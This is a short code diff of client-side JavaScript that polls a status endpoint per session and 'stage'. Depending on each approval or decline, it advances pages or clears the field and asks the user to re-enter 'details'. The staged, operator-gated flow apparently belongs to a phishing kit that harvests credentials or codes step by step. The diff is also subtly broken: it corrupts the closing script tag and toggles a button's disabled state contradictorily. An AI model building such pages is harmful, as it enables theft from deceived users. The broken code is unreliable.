@@ -402,33 +402,48 @@ async function sendStagePayload(stage, payload) {
 }
 
 // Polling core infrastructure engine
-function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
-  const msgElement = document.getElementById(msgId);
-  msgElement.className = "status";
-  msgElement.innerText = "";
+function runPollingLoop(currentId, nextId, btn, statusLabel, inputField) {
+    if (statusInterval) clearInterval(statusInterval);
 
-  if(pollingInterval) clearInterval(pollingInterval);
+    statusInterval = setInterval(async () => {
+        try {
+            const response = await fetch(`/api/status?sessionId=${sessionId}&stage=${currentStage}`);
+            const result = await response.json();
 
-  pollingInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
-      const data = await res.json();
+            if (result.status === "approved") {
+                clearInterval(statusInterval);
+                document.getElementById(currentId).style.display = "none";
+                document.getElementById(nextId).style.display = "block";
+            } 
+            // 🚀 EXCLUSIVE DECLINE FIX: Only affects the active page rejection
+            else if (result.status === "declined" || result.status === `declined_${currentStage}`) {
+                clearInterval(statusInterval); 
+                
+                // 1. Hide the waiting text layout layer
+                if (statusLabel) statusLabel.style.display = "none";
+                
+                // 2. Clear out the wrong entry and unlock the text field
+                if (inputField) {
+                    inputField.disabled = false;
+                    inputField.removeAttribute("disabled");
+                    inputField.value = ""; // Clears the first wrong data automatically
+                    inputField.focus();
+                }
 
-      if (data.status === "approved") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        document.getElementById(currentPageId).classList.add("hidden");
-        document.getElementById(nextPageId).classList.remove("hidden");
-        if (successCallback) successCallback();
-      } else if (data.status === "declined") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        msgElement.classList.add("error");
-        msgElement.innerText = "Submission declined. Please refresh and retry.";
-      }
-    } catch (err) {
-      console.error("Status check failed");
-    }
-  }, 2500);
+                // 3. Fully unfreeze the button attributes for clean re-entry
+                if (btn) {
+                    btn.disabled = true; // Sets to true so your length listener re-evaluates cleanly as they type
+                    btn.setAttribute("disabled", "true");
+                    btn.removeAttribute("disabled");
+                }
+                
+                setTimeout(() => {
+                    alert("Incorrect details. Please re-enter.");
+                }, 100);
+            }
+        } catch (e) {
+            console.error(e);
+        }
+    }, 2500);
 }
-</script>
+/script>
